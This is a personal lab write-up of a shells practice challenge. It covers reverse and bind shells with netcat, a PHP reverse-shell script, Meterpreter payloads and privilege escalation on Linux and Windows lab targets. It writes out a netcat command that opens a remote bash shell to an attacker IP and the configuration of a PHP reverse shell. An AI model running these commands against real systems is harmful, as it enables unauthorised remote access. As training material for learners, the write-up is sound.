# Practice Challenge

1. Try uploading a webshell to the Linux box, then use the command: `nc <LOCAL-IP> <PORT> -e /bin/bash` to send a reverse shell back to a waiting listener on your own machine.

```bash
set_time_limit (0);
$VERSION = "1.0";
$ip = '10.11......';  // CHANGE THIS
$port = 9092;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
```

1. Navigate to `/usr/share/webshells/php/php-reverse-shell.php` in Kali and change the IP and port to match your tun0 IP with a custom port. Set up a netcat listener, then upload and activate the shell.

```bash
sudo nano /usr/share/webshells/php/php-reverse-shell.php
```

1. Log into the Linux machine over SSH using the credentials in task 14. Use the techniques in Task 8 to experiment with bind and reverse netcat shells.

Reverse Shell —-Attacker Machine:

```bash
sudo nc -lvnp 9092 
listening on [any] 9092 ...
connect to [10.11.147.161] from (UNKNOWN) [10.10.105.51] 34744
whoami
shell
```

![Screenshot_2025-11-07_15-26-03.png](Screenshot_2025-11-07_15-26-03.png)

Target Machine:

```bash
ssh shell@10.10.105.51
shell@10.10.105.51's password: 

         ____  _          _ _   ____                 _   _          
        / ___|| |__   ___| | | |  _ \ _ __ __ _  ___| |_(_) ___ ___ 
        \___ \| '_ \ / _ \ | | | |_) | '__/ _` |/ __| __| |/ __/ _ \
         ___) | | | |  __/ | | |  __/| | | (_| | (__| |_| | (_|  __/
        |____/|_| |_|\___|_|_| |_|   |_|  \__,_|\___|\__|_|\___\___|

                                                    
shell@ip-10-10-105-51:~$ whoami
shell
shell@ip-10-10-105-51:~$ nc 10.11.147.161 9092 -e /bin/bash
```

![Shell_target2.png](Shell_target2.png)

Bind shell:

![shelllisten.png](shelllisten.png)

Running a non-interactive shell, here when i connect every single command i ran on the attacker machine reflect on the target machine as as well.

![shelllistenerrr.png](shelllistenerrr.png)

1. Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.
2. Look through [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and try some of the other reverse shell techniques. Try to analyse them and see *why* they work.

## Reverse Shell

### Bash TCP payload

Attacker machine:

![bash_shell1.png](bash_shell1.png)

Target Machine:

![bash_shell2.png](bash_shell2.png)

Attacker:

![A_shell1.png](A_shell1.png)

Target:

![A_shell2.png](A_shell2.png)

**PHP payload**

Attacker:

![A_phpShell1.png](A_phpShell1.png)

Target:

![A_phpShell2.png](A_phpShell2.png)

### **Netcat Traditional**

Attacker:

![netcat_shell1.png](netcat_shell1.png)

Target:

![netcat_shell2.png](netcat_shell2.png)

### **Netcat OpenBsd**

Attacker:

![opds1.png](opds1.png)

Target:

![opds2.png](opds2.png)

1. Switch to the Windows VM. Try uploading and activating the `php-reverse-shell`. Does this work?

![AB1.png](AB1.png)

1. Upload a webshell on the Windows target and try to obtain a reverse shell using Powershell.
2. The webserver is running with SYSTEM privileges. Create a new user and add it to the "administrators" group, then login over RDP or WinRM.
3. Experiment using socat and netcat to obtain reverse and bind shells on the Windows Target.

![A1.png](A1.png)

![A2.png](A2.png)

1. Create a 64bit Windows Meterpreter shell using msfvenom and upload it to the Windows Target. Activate the shell and catch it with multi/handler. Experiment with the features of this shell.
2. Create both staged and stageless meterpreter shells for either target. Upload and manually activate them, catching the shell with *netcat* -- does this work?